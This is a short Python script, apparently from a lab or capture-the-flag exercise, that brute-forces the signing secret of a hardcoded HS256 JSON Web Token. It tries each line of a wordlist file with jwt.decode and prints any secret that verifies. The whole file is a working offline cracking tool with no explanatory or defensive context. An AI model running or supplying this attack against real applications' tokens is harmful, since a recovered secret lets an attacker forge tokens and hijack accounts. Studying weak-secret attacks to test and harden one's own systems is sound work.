import jwt
import sys

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImMwODUyZmZmLWM5YTktNGI1Yy1hNDkwLTc3ZDUzZjQ2ZmVjZCIsImVtYWlsIjoiaGFja2VyX2I5YzYyNTdhLTk4MGMtNGU3Yy1iMGZmLTdjZDA1YzI3NDMxM0B0ZXN0LmNvbSIsImlhdCI6MTc2MzgyNDg3NCwiZXhwIjoxNzYzODI1Nzc0fQ.k1AXmNgQjClkweDKUNGrMPvfQxS5mhGYeYvBEqiXuTc"

try:
    with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            if not secret: continue
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(f"FOUND SECRET: {secret}")
                sys.exit(0)
            except jwt.exceptions.InvalidSignatureError:
                continue
            except Exception as e:
                pass
except Exception as e:
    print(f"Error reading wordlist: {e}")

print("Failed to crack.")
